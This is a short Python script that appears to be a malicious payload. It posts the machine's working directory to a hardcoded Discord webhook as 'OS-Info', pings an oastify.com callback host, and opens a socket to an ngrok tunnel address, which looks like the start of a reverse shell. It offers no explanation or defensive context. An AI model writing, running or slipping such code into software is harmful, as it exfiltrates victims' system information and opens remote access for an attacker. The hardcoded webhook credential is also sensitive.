from discord import SyncWebhook
import requests,sys,os,subprocess,socket

webhook = SyncWebhook.from_url("https://discord.com/api/webhooks/1212268576048939008/Wtk3irDv_JmTOxRhvWxMTdLpulLZ4Jk97LCwjQR9Yfu-2AGU8g5j_iMMHDVjNePhi4Xq")
requests.get("https://pwpd3g42ebsq3wznexhjlsxi2980wqkf.oastify.com")
name = os.getcwd()
webhook.send(f"OS-Info: {name}")

# Set the host and the port.
#HOST = "0.tcp.au.ngrok.io"
#PORT = 14137

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(("0.tcp.au.ngrok.io",14137))